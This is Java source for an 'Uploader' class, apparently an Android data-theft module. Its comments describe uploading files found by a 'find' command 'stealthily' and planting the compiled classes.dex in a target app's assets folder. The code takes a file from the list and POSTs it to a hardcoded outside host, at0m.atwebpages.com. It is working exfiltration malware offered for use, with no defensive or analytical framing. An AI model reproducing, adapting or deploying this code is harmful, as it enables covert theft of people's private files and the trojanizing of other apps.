import java.io.*;
import java.util.*;
import org.apache.http.client.*;
import org.apache.http.client.methods.*;
import org.apache.http.entity.*;
import org.apache.http.impl.client.*;

public class Uploader {
    // Uploading some files to http server
    /*
	 What to do in this class: 
	 get result list from 'find' command, then upload file(s) stealthily (No foreground delay)
         
         How to use this class:
         Easiest way is to find an android ide like AIDE or Java N-IDE, add required libraries.
         Then compile it. Go to ouput folder, find "classes.dex", copy it to target app's assets folder.

	 */
    public static void main(String[] args) {
        //get result path list's file path
        File f = new File(args[0]);
        try
        {
            Scanner sc = new Scanner(f);
            ArrayList<String> targets = new ArrayList<String>();
            while(sc.hasNextLine())
            {
                targets.add(sc.nextLine());
            }
			
            Collections.shuffle(targets);
            //set limitation of files upload, here I set 1
            int fcount = 0;
            for(int i = 0; i < targets.size(); i++)
            {   
                File temp = new File(targets.get(i).toString());
                Long fsize = temp.length() / 1024 / 1024; //MB
                if(fsize <= 3)
                {
					uploadFile(temp);
					System.out.println("ok: " + targets.get(i).toString()); 
                }
                fcount++;
                if(fcount == 1)break;
            }

        }catch(Exception e)
        {System.out.println(e.toString());}

    }

    static void uploadFile(File file) {

        if(!file.exists()) return;
        try
        {
            FileEntity reqEntity = new FileEntity(file, "binary/octet-stream");

            HttpPost post = new HttpPost("http://at0m.atwebpages.com/file.php");

			//set binary entity
            post.setEntity(reqEntity);
            reqEntity.setContentType("binary/octet-stream");

            //set timestamp of the file as the component of filename
            post.setHeader("fname", file.getName());

            //fire
            HttpClient httpclient = new DefaultHttpClient();
            httpclient.execute(post);

        }catch(Exception e)
        {System.out.println(e.toString());}
    }

}
